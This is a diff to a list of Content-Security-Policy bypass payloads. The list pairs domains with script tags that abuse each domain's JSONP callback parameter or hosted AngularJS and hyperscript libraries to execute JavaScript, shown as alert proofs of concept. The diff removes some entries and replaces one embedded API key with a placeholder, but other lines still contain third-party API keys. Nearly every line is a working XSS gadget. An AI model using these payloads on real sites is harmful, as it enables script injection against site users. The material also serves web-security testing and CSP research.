@@ -12,7 +12,6 @@ ajax.googleapis.com	<script src="https://ajax.googleapis.com/ajax/libs/angularjs
 anchor.digitalocean.com	<script src="https://anchor.digitalocean.com/index.php/form/getForm?munchkinId=113-DTN-266&form=1402&callback=alert"></script>
 api-js.mixpanel.com  <script src="https://api-js.mixpanel.com/engage/?callback=alert(1)"></script>
 api-v3.tinypass.com  <script src="https://api-v3.tinypass.com/api/v3/conversion/logAutoMicroConversion?callback=alert"></script>
-ap.lijit.com	<script src="https://ap.lijit.com/rtb/bid?callback=alert&br={%22id%22:%221%22,%22site%22:{%22domain%22:%22x%22,%22page%22:%22x%22}}"></script>
 api.bazaarvoice.com	<script src="https://api.bazaarvoice.com/data/batch.json?passkey=e75powr7wqhg1ah5seu00zawf&callback=alert"></script>
 api.bing.com	<script src="https://api.bing.com/osjson.aspx?query=x&JsonType=callback&JsonCallback=alert"></script>
 api.braintreegateway.com  <script src="https://api.braintreegateway.com/merchants/x/client_api/v1/payment_methods/credit_cards?callback=alert"></script>
@@ -53,7 +52,7 @@ assets.twitch.tv  <script src="https://assets.twitch.tv/eppo/api/flag-config/v1/
 bookmark.hatenaapis.com	<script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
 buy.tinypass.com   <script src="https://buy.tinypass.com/api/v3/anon/template/loadTemplateContext?callback=alert"></script>
 c.y.qq.com	<script src="https://c.y.qq.com/v8/fcg-bin/v8.fcg?&notice=0&format=jsonp&channel=singer&page=list&jsonpCallback=alert"></script>
-cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>
+cas.criteo.com	<script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert"></script>
 cdn.arkoselabs.com	<script src="https://cdn.arkoselabs.com/fc/a/?callback=alert"></script>
 cdn.bootcdn.net	<script src="https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 cdn.bootcss.com	<script src="https://cdn.bootcss.com/angular.js/1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
@@ -113,7 +112,6 @@ gum.criteo.com	<script src="https://gum.criteo.com/sync?c=123&r=2&a=1&j=alert"><
 hcaptcha.com	<script src="https://hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
 help.afterpay.com	<script src="https://help.afterpay.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
 iam.clients6.google.com	<script src="https://iam.clients6.google.com/v1/projects/gen-lang-client-1/serviceAccounts?callback=alert(1)"></script>
-ib.adnxs.com	<script src="https://ib.adnxs.com/async_usersync?cbfn=alert(1)-"></script>
 identitytoolkit.googleapis.com	<script src="https://identitytoolkit.googleapis.com/v1/projects?callback=alert(1)"></script>
 info.cloudflare.com	<script src="https://info.cloudflare.com//index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
 info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munchkinId=813-MAM-392&form=6196&callback=alert"></script>
@@ -150,7 +148,6 @@ page.gitlab.com	<script src="https://page.gitlab.com/index.php/form/getForm?munc
 pages.nist.gov	<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>
 passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
-portal.ayco.com	<script src="https://portal.ayco.com/publicBundles/angularjs"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
 public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>
 query.fqtag.com	<script src="https://query.fqtag.com/b?callback=alert(1)"></script>
@@ -208,13 +205,12 @@ unpkg.com	<script src="https://unpkg.com/hyperscript.org"></script><x _="on load
 urs.pbs.org	<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>
 vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>
 visitor-service.tealiumiq.com	<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>
-visitor.pixplug.in	<script src="https://visitor.pixplug.in/jsonp/getdata.php?callback=alert(1)"></script>
 wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>
 widget.usersnap.com	<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>
 widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>
 wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>
 wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>
-wse.api.here.com	<script src="https://wse.api.here.com/v8/findsequence2?apiKey=PJy8lvw9xxcCnYDFFsp8IvQB_l7ScobQmQ2xttBWfuQ&jsonCallback=alert(origin);void&mode=TransportModes"></script>
+wse.api.here.com	<script src="https://wse.api.here.com/v8/findsequence2?apiKey=<valid-api-key-here>&jsonCallback=alert(origin);void&mode=TransportModes"></script>
 www-api.ibm.com	<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>
 www.ancestrycdn.com	<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 www.bing.com	<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>
